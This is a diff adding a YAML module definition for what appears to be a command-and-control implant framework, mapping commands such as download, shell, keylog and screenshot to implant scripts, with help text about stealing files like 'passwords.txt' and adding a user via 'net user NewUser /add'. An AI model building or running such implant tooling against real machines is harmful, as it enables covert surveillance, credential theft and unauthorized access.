@@ -1,0 +1,74 @@
+mod_name : Core
+
+load_dir : resources/loaders/bs_tcp/core/
+
+help :
+  - - cd
+    - Change directory on the target machine. If blank print current working directory.
+  - - cwd
+    - Print the current working direcory of the implant.
+  - - download
+    - Download a file from the target, e.g. download passwords.txt.
+  - - keylog
+    - Collect keystroke data from the target machine.
+  - - ls
+    - List contents of a given direcotyr (Default current working directory).
+  - - screenshot
+    - Take a screenshot on the target machine.
+  - - shell
+    - NOT OPSEC SAFE - Execure shell commands on the target machine.
+
+
+methods:
+  - name : download
+    menu : False
+    agent : agent/download.py
+    implant : implant/download.py
+    help : "Download a file from the target e.g.\n
+    \tdownload passwords.txt\n
+    \tdownload C:\\Users\\User\\Documents\\secrets.docx"
+
+  - name : shell
+    menu : False
+    agent : False
+    implant : implant/shell.py
+    help : "NOT OPSEC SAFE - Execute shell commands on the target machine. e.g.\n
+    \tshell ls\n
+    \tshell net user NewUser /add"
+
+  - name : cd
+    menu : False
+    agent: False
+    implant : implant/cd.py
+    help : "Change directory on the target machine.\n
+    If no directory provided, will print current working directory."
+
+  - name : screenshot
+    menu : False
+    agent: agent/screenshot.py
+    implant : implant/screenshot.py
+    help : "Take a screenshot on the target machine:\n\n
+    \t--show -s : also show the screenshot via your OS image viewer."
+
+  - name : keylog
+    menu : False
+    agent: agent/keylog.py
+    implant : implant/keylog.py
+    help : "Log keystrokes on the target machine:\n\n
+    \t--start -s : Start the keylogger running.\n
+    \t--dump  -d : Collect logged keystrokes and save to file.\n
+    \t--show  -v : Show dumped keystrokes [Used in conjunction with dump only].\n
+    \t--clear -c : Clear kelogger data from the agent.\n
+    \t--kill  -k : Stop the keylogger."
+
+  - name : ls
+    menu : False
+    agent: False
+    implant : implant/ls.py
+    help : "List contents of a given working directory. Will default to working directory if none provided."
+
+  - name : cwd
+    menu : False
+    agent: False
+    implant : implant/cwd.py
+    help : "Prints current working directory."
